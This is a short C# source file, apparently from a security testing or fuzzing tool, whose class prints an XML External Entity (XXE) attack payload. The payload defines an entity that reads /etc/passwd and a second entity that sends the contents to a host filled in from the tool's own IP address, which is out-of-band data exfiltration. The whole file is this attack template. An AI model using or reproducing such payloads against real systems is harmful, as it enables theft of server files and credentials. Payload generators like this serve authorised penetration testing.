using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CShidori.Core;
using CShidori.DataHandler;

namespace CShidori.Generator
{
    public class XxeTemplate
    {
        public XxeTemplate()
        {

            string XxeString = @"
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY %xxe SYSTEM ""file:///etc/passwd"">
<!ENTITY call SYSTEM ""§/?%xxe;"">
]
>
<foo>&call;</foo>
            ";

            Console.WriteLine(XxeString.Replace("§", Misc.GetIp()).Replace("foo", Misc.RandomString(3)));
        }
    }
}
